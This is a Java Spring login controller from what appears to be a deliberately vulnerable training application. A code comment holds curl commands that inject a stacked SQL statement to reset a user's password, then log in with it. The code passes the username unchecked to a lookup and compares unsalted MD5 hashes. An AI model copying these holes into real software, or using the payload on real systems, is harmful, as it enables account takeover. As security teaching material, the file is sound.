package com.scalesec.vulnado;

import org.springframework.boot.*;
import org.springframework.http.HttpStatus;
import org.springframework.web.bind.annotation.*;
import org.springframework.boot.autoconfigure.*;

import java.io.Serializable;

@RestController
@EnableAutoConfiguration
public class LoginController {

    /*
    * NOTE: Though you may not be able to execute a 1=1 type login, you can still update the password and re-login a separate time
    *
    * $ curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8080/login'
    * $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login'
    * */

    @RequestMapping(value = "/login", method = RequestMethod.POST, produces = "application/json", consumes = "application/json")
    User login(@RequestBody LoginInput input) {
        User user = User.fetch(input.username);
        if (Postgres.md5(input.password).equals(user.hashedPassword)) {
            return user;
        } else {
            throw new Unauthorized("Access Denied");
        }
    }
}

class LoginInput implements Serializable {
    public String username;
    public String password;
}

@ResponseStatus(HttpStatus.UNAUTHORIZED)
class Unauthorized extends RuntimeException {

    public Unauthorized(String exception) {
        super(exception);
    }

}